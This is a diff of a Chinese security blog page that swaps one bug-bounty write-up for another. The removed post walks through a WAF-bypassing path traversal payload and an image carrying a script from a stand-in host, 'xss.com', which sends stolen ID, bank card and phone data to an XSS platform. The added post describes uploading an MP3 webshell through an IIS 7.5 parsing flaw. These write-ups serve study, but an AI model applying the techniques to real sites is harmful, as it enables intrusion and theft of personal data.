@@ -16,31 +16,38 @@
   <meta name="author" content="X1ly?S">
   <meta name="keywords" content="网络安全 渗透测试">
   
-    <meta name="description" content="声明：本SRC案例来自J0神，此处只是做学习研究之用  漏洞发现 先是在某SRC官网FUZZ出一处图片显示接口，发现image__name参数是图片路径，那么有几个可尝试的点：文件包含getshell；目录穿越；ssrf……  1https:&#x2F;&#x2F;xxx.cn&#x2F;xxxx&#x2F;ueditor?image_name&#x3D;&#x2F;xxx.png   经过尝试，文件包含、ssrf都不行，只是拼接读取了远程资源站的图⽚。">
+    <meta name="description" content="声明：本案例来自J0神，此处只是做学习研究之用  漏洞发现 是一个提供⾳乐播放业务的资产     F12简单看下⽬标信息环境   ServerSoft:IIS 7.5 CMS:JYMusic(ThinkPHP)       找到一处CSS资源⽂件，试了下文件解析漏洞，成功了：get一个IIS7.5的文件解析漏洞，那么现在只需要找到上传点+文件解析漏洞就能getshell 了     尝试了修改头">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SRC案例-用组合拳在SRC官网盗走你的个人信息">
-<meta property="og:url" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/index.html">
+<meta property="og:title" content="SRC案例-一次移花接木的getshell">
+<meta property="og:url" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/index.html">
 <meta property="og:site_name" content="X1ly?S Blog">
-<meta property="og:description" content="声明：本SRC案例来自J0神，此处只是做学习研究之用  漏洞发现 先是在某SRC官网FUZZ出一处图片显示接口，发现image__name参数是图片路径，那么有几个可尝试的点：文件包含getshell；目录穿越；ssrf……  1https:&#x2F;&#x2F;xxx.cn&#x2F;xxxx&#x2F;ueditor?image_name&#x3D;&#x2F;xxx.png   经过尝试，文件包含、ssrf都不行，只是拼接读取了远程资源站的图⽚。">
+<meta property="og:description" content="声明：本案例来自J0神，此处只是做学习研究之用  漏洞发现 是一个提供⾳乐播放业务的资产     F12简单看下⽬标信息环境   ServerSoft:IIS 7.5 CMS:JYMusic(ThinkPHP)       找到一处CSS资源⽂件，试了下文件解析漏洞，成功了：get一个IIS7.5的文件解析漏洞，那么现在只需要找到上传点+文件解析漏洞就能getshell 了     尝试了修改头">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/1.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/2.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/3.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/4.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/5.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/6.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/7.png">
-<meta property="og:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/8.png">
-<meta property="article:published_time" content="2024-07-19T13:48:49.000Z">
-<meta property="article:modified_time" content="2024-07-19T13:58:36.606Z">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/1.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/2.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/3.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/4.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/5.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/6.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/7.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/8.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/9.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/10.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/11.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/12.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/13.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/14.png">
+<meta property="og:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/15.png">
+<meta property="article:published_time" content="2024-07-20T07:23:28.000Z">
+<meta property="article:modified_time" content="2024-07-20T07:24:47.785Z">
 <meta property="article:author" content="X1ly?S">
-<meta property="article:tag" content="用组合拳在SRC官网盗走你的个人信息">
+<meta property="article:tag" content="一次移花接木的getshell">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://example.com/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/1.png">
+<meta name="twitter:image" content="https://example.com/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/1.png">
   
   
   
-  <title>SRC案例-用组合拳在SRC官网盗走你的个人信息 - X1ly?S Blog</title>
+  <title>SRC案例-一次移花接木的getshell - X1ly?S Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -247,7 +254,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SRC案例-用组合拳在SRC官网盗走你的个人信息"></span>
+            <span id="subtitle" data-typed-text="SRC案例-一次移花接木的getshell"></span>
           
         </div>
 
@@ -263,8 +270,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-19 21:48" pubdate>
-          2024年7月19日 晚上
+        <time datetime="2024-07-20 15:23" pubdate>
+          2024年7月20日 下午
         </time>
       </span>
     
@@ -275,7 +282,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          830 字
+          588 字
         
       </span>
     
@@ -286,7 +293,7 @@
         
         
         
-          7 分钟
+          5 分钟
         
       </span>
     
@@ -331,12 +338,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SRC案例-用组合拳在SRC官网盗走你的个人信息</h1>
+            <h1 id="seo-header">SRC案例-一次移花接木的getshell</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年7月19日 晚上
+                    本文最后更新于 2024年7月20日 下午
                   
                 
               </p>
@@ -345,88 +352,80 @@
               <div class="markdown-body">
                 
                 <blockquote>
-<p>声明：本SRC案例来自J0神，此处只是做学习研究之用</p>
+<p>声明：本案例来自J0神，此处只是做学习研究之用</p>
 </blockquote>
 <h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol>
-<li>先是在某SRC官网FUZZ出一处图片显示接口，发现image__name参数是图片路径，那么有几个可尝试的点：文件包含getshell；目录穿越；ssrf……</li>
+<li>是一个提供⾳乐播放业务的资产</li>
 </ol>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://xxx.cn/xxxx/ueditor?image_name=/xxx.png<br></code></pre></td></tr></table></figure>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/1.png" srcset="/img/loading.gif" lazyload class="">
 
 <ol start="2">
-<li>经过尝试，文件包含、ssrf都不行，只是拼接读取了远程资源站的图⽚。但在给路径后加上”+”后，奇迹出现了：</li>
+<li>F12简单看下⽬标信息环境</li>
 </ol>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://xxx.cn/xxxx/ueditor?image_name=/xxx.png+<br></code></pre></td></tr></table></figure>
+<ul>
+<li><strong>ServerSoft:IIS 7.5 CMS:JYMusic(ThinkPHP)</strong></li>
+</ul>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/2.png" srcset="/img/loading.gif" lazyload class="">
 
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/1.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/3.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>图⽚被意外的解析成了HTML⻚⾯，此处存在文件解析漏洞！</p>
 <ol start="3">
-<li>既然能把png解析为html，那么我们构造一个带有JS代码的图片，访问路径，加上”+”，就构成了存储型XSS</li>
-<li>继续尝试目录穿越，&#x2F;..&#x2F;..&#x2F;3.png，出现了自研WAF，拦截了</li>
+<li>找到一处CSS资源⽂件，试了下文件解析漏洞，成功了：get一个IIS7.5的文件解析漏洞，那么现在只需要找到上传点+文件解析漏洞就能getshell 了</li>
 </ol>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/2.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/4.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="4">
+<li>尝试了修改头像处，发现对上传的文件进行了二次渲染，上传⼀些⼆次渲染后仍能执⾏的Webshell后，依然发现⽆法正常getshell，遂放弃这一点</li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/5.png" srcset="/img/loading.gif" lazyload class="">
 
 <ol start="5">
-<li>没事，使用burp FUZZ一下就bypass了</li>
+<li>头像上传⾛不通那么只能另寻出路，来到分享⾳乐功能，但这里的功能用户自己上传文件修改成了⼈⼯邮箱审核，<strong>但是猜测上传接⼝还是存在的</strong>，于是根据目标CMS特征找到其他可以用户上传分享⾳乐(未改动)的网站，借用其接口，<strong>同一套CMS，二者接口肯定是一致的</strong></li>
 </ol>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Payload</span><span class="hljs-punctuation">: </span>/..%252F/<br></code></pre></td></tr></table></figure>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/6.png" srcset="/img/loading.gif" lazyload class="">
 
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/3.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h2><p>现在已经可以存储型XSS+目录穿越了，又已知该SRC官网因为要打款奖励，所以需要用户填写个⼈信息(姓名，⼿机号，sfz等信息)，⽽这些信息⽤户自己可以在个人中心处查看，于是直接打一套组合拳提升危害，去盗取这些个人信息</p>
-<ol>
-<li>利⽤010Editor或copy命令，构造含有恶意代码的图⽚</li>
+<ol start="6">
+<li>于是，通过fofa找到⼀个功能正常的站点，以下称为<a target="_blank" rel="noopener" href="http://www.bbb.com,这个站点的分享音乐功能是正常的/">www.bbb.com，这个站点的分享⾳乐功能是正常的</a></li>
 </ol>
-<ul>
-<li>010Editor：就不多说了，以16进制方式打开后，直接把js代码加在末尾就可以了</li>
-<li>copy命令：</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">copy tiny.png /b + code.txt /a tiny_code.png<br></code></pre></td></tr></table></figure>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/7.png" srcset="/img/loading.gif" lazyload class="">
 
-<p> 拿一张很小的普通图片tiny.png，js代码写在code.txt，二者合成生成了tiny_code.png：插入了恶意js代码的图片</p>
-<ul>
-<li>code.txt</li>
-</ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://xss.com/xxx/demo.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-
-<p>这个<a target="_blank" rel="noopener" href="http://xss.com/xxx/demo.js%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E6%8A%8Ademo.js%E9%83%A8%E7%BD%B2%E5%9C%A8%E4%BA%86%E8%BF%9C%E7%A8%8BXSS%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9C%8B%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E6%9B%B4%E5%A4%9A%E7%9A%84JS%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%B8%94%E6%96%B9%E4%BE%BF%E6%8E%A5%E6%94%B6%E6%89%A7%E8%A1%8C%E5%BE%97%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE">http://xss.com/xxx/demo.js其实就是把demo.js部署在了远程XSS平台，这样看可以执行更多的JS代码，且方便接收执行得到的数据</a></p>
-<ul>
-<li>demo.js</li>
-</ul>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/4.png" srcset="/img/loading.gif" lazyload class="">
-
-<p><strong>脚本会通过Ajax请求URL，使⽤DOMParser转换并解析DOM对象，提取⽤户身份证、银⾏卡、⼿机号、地址等信息后合并base64编码发送到XSS平台接收数据</strong></p>
-<ol start="2">
-<li><p>构造好了恶意图片，那么就去找文件上传接口上传图片了，直接上传刚刚构造好的恶意图片，但是上传到的路径不是那个存在文件解析漏洞的路径下，于是目录遍历漏洞就派上用场了，在那个存在文件解析漏洞的接口image__name参数传入&#x2F;..%252F&#x2F;xxx&#x2F;xxx&#x2F;tiny_code.png穿越一下目录，就可以了</p>
-</li>
-<li><p>然后再构造一个，用来钓鱼跳转的网站，实现只要受害者访问该网站，就自动跳转去请求我们刚才的恶意图片链接(被解析为了html执行)，就会无感的触发其中已经构造好的js代码，去远程调用XSS平台中的demo.js，获取SRC官网个人中心处的个人信息，并把数据发送给XSS平台接收</p>
-</li>
+<ol start="7">
+<li>直接上传含有一句话木马的⾳乐⽂件</li>
 </ol>
-<ul>
-<li>钓鱼跳转网站</li>
-</ul>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/5.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/8.png" srcset="/img/loading.gif" lazyload class="">
 
-<ul>
-<li>构造好的恶意图片链接(被解析为了html执行)</li>
-</ul>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/6.png" srcset="/img/loading.gif" lazyload class="">
-
-<ul>
-<li>XSS平台接收到数据</li>
-</ul>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/7.png" srcset="/img/loading.gif" lazyload class="">
-
-<ul>
-<li>成功窃取到受害者的信息，base64解码即可</li>
-</ul>
-<img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/8.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="技术点总结"><a href="#技术点总结" class="headerlink" title="技术点总结"></a>技术点总结</h2><ol>
-<li>Fuzz出接⼝及参数,拼接+号解析成HTML⻚⾯</li>
-<li>URL拼接时BypassWAF进⾏⽬录穿越</li>
-<li>使⽤DOMParser转换为DOM对象并提取表单input值，后通过window.btoa函数base64编码字符串</li>
+<ol start="8">
+<li>⽂件正常上传，但是没有返回上传路径，提交整个表单试试，提示没有分类数据</li>
 </ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/9.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="9">
+<li>没事直接前端加一个就行了，祭出神器F12给select标签加⼀个有value值的option。</li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/10.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="10">
+<li>提示分享成功，查看审核列表也有了，编辑发现ID为23，⾸⻚随便点进去⼀个发现id为21。</li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/11.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="11">
+<li>同时发现存在一个接⼝可以获取⾳乐上传路径，替换为ID&#x3D;23后取得路径</li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/12.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/13.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="12">
+<li>这些是在<a target="_blank" rel="noopener" href="http://www.bbb.com的分享音乐功能操作,已知可上传含有木马的mp3,可利用接口获取上传路径,但是我们的目标是先前的网站,由于先前的网站无法显式地上传文件,我们才去同类网站找上传接口的,现已找到,于是只需把在www.bbb.com的分享音乐功能操作,在先前的网站再做一遍就行了.直接把www.bbb.com上传音乐文件的请求,移花接木到www.aaa.com上(burp改包host和cookie,提交时改fileid)/">www.bbb.com的分享音乐功能操作，已知可上传含有木马的mp3，可利用接口获取上传路径，但是我们的目标是先前的网站，由于先前的网站无法显式地上传文件，我们才去同类网站找上传接口的，现已找到，于是只需把在www.bbb.com的分享音乐功能操作，在先前的网站再做一遍就行了。直接把www.bbb.com上传⾳乐⽂件的请求，移花接⽊到www.aaa.com上（burp改包host和cookie，提交时改fileid）</a></li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/14.png" srcset="/img/loading.gif" lazyload class="">
+
+<ol start="13">
+<li>通过解析漏洞访问我们后缀名为MP3的webshell，成功getshell！</li>
+</ol>
+<img src="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/15.png" srcset="/img/loading.gif" lazyload class="">
+
 
                 
               </div>
@@ -460,7 +459,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/" class="print-no-link">#用组合拳在SRC官网盗走你的个人信息</a>
+        <a href="/tags/%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/" class="print-no-link">#一次移花接木的getshell</a>
       
     </div>
   
@@ -474,18 +473,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/20/SRC%E6%A1%88%E4%BE%8B-%E4%B8%80%E6%AC%A1%E7%A7%BB%E8%8A%B1%E6%8E%A5%E6%9C%A8%E7%9A%84getshell/" title="SRC案例-一次移花接木的getshell">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SRC案例-一次移花接木的getshell</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/19/SRC%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E6%B8%85%E5%8D%95%E4%B8%80/" title="SRC挖掘思路清单一">
-                        <span class="hidden-mobile">SRC挖掘思路清单一</span>
+                      <a href="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/" title="SRC案例-用组合拳在SRC官网盗走你的个人信息">
+                        <span class="hidden-mobile">SRC案例-用组合拳在SRC官网盗走你的个人信息</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
